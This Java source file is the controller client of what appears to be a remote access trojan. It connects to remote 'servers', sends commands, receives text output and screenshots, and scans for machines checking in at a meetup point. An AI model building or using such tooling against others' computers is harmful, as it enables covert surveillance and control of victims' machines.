package ratclient;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;

import javax.imageio.ImageIO;

public class RatClient {
	public Socket socket;
	
	public PrintWriter out; //direct output to socket
	
	public BufferedReader in; //direct input to socket
	
	public ServerScanner ssc; //scan for servers reference object
	boolean disconnect;
	
	public RatClient(PrintStream out) {
		socket = null;		
		System.setOut(out);//re-route system.out.println() to the console screen for errors and messages
	}
	
	public void close() throws IOException { //close all parts of the socket
		if(socket != null) {
			socket.close();
		}
		
		if(out != null) {
			out.close();
		}
		
		if(in != null) {
			in.close();
		}
	}
	
	public void send(String str) { //send data
		out.println(str);
	}
	
	public boolean connect(String ip, int port) { //connect to server
		
		try {
			socket = new Socket();
			socket.connect(new InetSocketAddress(ip, port), 4000);//try connecting, timeout of 4 secs
			out = new PrintWriter(socket.getOutputStream(), true);
			in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
		
			if(socket.isConnected() && socket.isBound()) {
				System.out.println("Connected");
				return true;
			} else {
				System.out.println("Not Connected");
			}
			//Uh-oh, didn't connect, show error
		} catch(UnknownHostException e) {
			System.out.println("Unknown Host: " + ip);
		} catch(ConnectException e) {
			System.out.println("No server at " + ip);
		} catch(SocketTimeoutException e) {
			System.out.println("Connection timed out");
		} catch(Exception e) {
			System.out.println("Error!");
			e.printStackTrace();
		}
		return false;
	}
	
	public void disconnect() { //make sure to disconnect correctly
		try {
			disconnect = true;
			close();
			socket = null;
		} catch (IOException e) { //something really bad happened
			e.printStackTrace();
			System.exit(-1);
		}
	}
	
	public void waitForResponse(CommandLib lib) { //wait for a response to a command
		String input;
		try {
			while((input = in.readLine()) != null && !input.equals("end")) { //read input until we get 
				System.out.println(input); //an "end" line all by itself
			}
		} catch(SocketException e) {
			System.out.println("Server has gone offline"); //server disconnects during command
			lib.disconnect();
		} catch (IOException e) { //Other
			e.printStackTrace();
		} catch(java.lang.Error e) { }//Other
	}
	
	public void waitForImageResponse(CommandLib lib) { //get screenshot image
		try {
			String input;
			boolean done = false;
			BufferedImage image = null;
			System.out.println("Waiting for input");
			while(!done) {
				if((input = in.readLine()).equals("start")) {//wait for start block
					System.out.println("Reading Input");
					image = ImageIO.read(socket.getInputStream());//get data directly into image buffer
					new ImageWindow(image);	//just open up the window with the image
				}
				if((input = in.readLine()).equals("end")) { //end of data
					while((input = in.readLine()) != null && !input.equals("done")) { }
					done = true;
				}
			}
			
			
		} catch(SocketException e) {
			System.out.println("Server has gone offline");
			lib.disconnect();	
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void scan(CommandLib cmd) { //use scanner to check for multiple machines
		try {
			System.out.println("Scanning...");
			ssc = new ServerScanner();
			ssc.start();
			try {
				Thread.sleep(3000);//wait 3 secs for all servers to ping meetup location
			} catch (InterruptedException e) {
				cmd.wake();//give control back to console
				ssc.disconnect();
				return;
			}
			System.out.println("HOST\tADDRESS"); //print out all servers
			for(int i = 0;i<ssc.getServers().size();i++) {
				System.out.println(ssc.getServers().get(i));	
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		
		cmd.wake(); //give back control to console
		ssc.disconnect(); //stop scanning
	}
	
	public boolean getDisconnect() {
		return disconnect;
	}
	
	
	class Input extends Thread { //special messages from server reader thread
		
		@Override
		public void run() {
			String input;
			while(!getDisconnect()) {
				try {
					if((input = in.readLine()) != null) {
					 System.out.println("SERVER: " + input);
					}
					
				} catch(SocketException e) {
					System.out.println("Disconnected");
					return;
				}catch(Exception e) {
					e.printStackTrace();
					System.exit(-1);
				}
			}
		}
	}
}